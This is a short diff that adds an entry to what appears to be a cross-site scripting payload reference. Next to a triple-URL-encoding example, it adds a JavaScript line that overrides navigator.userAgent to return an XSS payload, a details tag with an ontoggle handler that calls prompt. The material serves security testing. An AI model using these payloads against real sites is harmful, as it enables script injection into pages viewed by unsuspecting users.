@@ -124,3 +124,8 @@ Triple Encoding
 ```
 %25253c
 ```
+Override the getter for User Agent is pulled from browser vs header
+```javascript
+navigator.__defineGetter__('userAgent',function(){return '<details open ontoggle=prompt(\'asdf\')>'});navigator.userAgent
+```
+
